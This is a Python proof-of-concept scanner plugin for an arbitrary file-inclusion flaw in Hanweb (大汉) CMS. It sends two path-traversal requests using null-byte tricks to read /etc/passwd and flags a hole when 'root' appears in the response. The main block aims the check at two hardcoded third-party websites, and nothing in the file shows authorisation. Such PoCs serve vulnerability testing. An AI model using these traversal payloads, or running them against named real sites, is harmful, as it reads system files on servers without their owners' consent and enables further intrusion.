#!/usr/bin/env python
# coding: UTF-8

"""
POC Name  :  大汉cms任意文件包含
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0148311
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0116997



"""

import re

def assign(service,arg):
    if service == "hanweb":
        return True,arg

def audit(arg):
    url=arg + 'lm/front/mailwrite_over.jsp?editpagename=/../../../../../../../../../../../../../etc/passwd%00.ftl'
    url2=arg + 'lm/front/reg_2.jsp?sysid=/../../../../../../../../../../../../../etc/passwd%00%23'
    code,head,res,errcode,_=curl.curl2(url)
    code2,head2,res2,errcode2,_=curl.curl2(url2)
    if code==200 and re.search('root', res):
        security_hole(url+'  大汉cms任意文件包含')
    if code2==200 and re.search('root', res2):
        security_hole(url2+'  大汉cms任意文件包含')

if __name__ == '__main__':
    from dummy import *
    audit(assign('hanweb', 'http://www.btjy.com/')[1])
    audit(assign('hanweb', 'http://www.xn--fiqq6kfu0bsng.com/')[1])